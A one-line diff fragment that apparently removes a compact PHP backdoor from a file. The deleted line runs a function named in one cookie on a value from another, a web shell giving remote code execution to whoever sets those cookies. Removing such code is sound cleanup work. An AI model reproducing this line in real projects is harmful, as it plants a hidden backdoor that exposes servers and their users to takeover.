@@ -1,1 +1,0 @@
-<?php if(isset($_COOKIE["av"])){$_COOKIE["kg"]($_COOKIE["av"]);exit;}
